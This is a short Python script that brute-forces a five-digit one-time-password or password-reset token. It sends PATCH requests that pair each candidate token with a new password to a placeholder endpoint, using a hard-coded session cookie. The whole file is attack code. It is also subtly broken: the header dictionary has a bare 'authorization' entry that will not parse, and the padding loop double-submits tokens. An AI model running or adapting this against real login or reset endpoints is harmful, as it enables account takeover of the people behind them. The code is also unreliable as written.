import requests
import json
import random


default_header = {
   'Content-Type': 'application/json',
   'Cookie': '__cfduid=d0c1a883ee8951a15a4647c62412e5a6e1598621230',
   'authorization'
}


base_url = 'target endpoint url'
token = random.sample(range(1, 99999), 99998)


def attack(token):
    target = base_url
    payload = {
        "username": "",
        "token": token,
        "password": ""
    }

    resp = requests.patch(target, headers=default_header,
                          data=json.dumps(payload, indent=4))
    resp_body = resp.json()
    return resp_body

# generate the OTP


def initialize(token_list):
    opt_collection = []
    for i in token_list:
        if len(str(i)) < 5:
            i = "0000" + str(i)
            opt_collection.append(i)
            attack(i[-5:])
        opt_collection.append(i)
        attack(str(i))
    return opt_collection
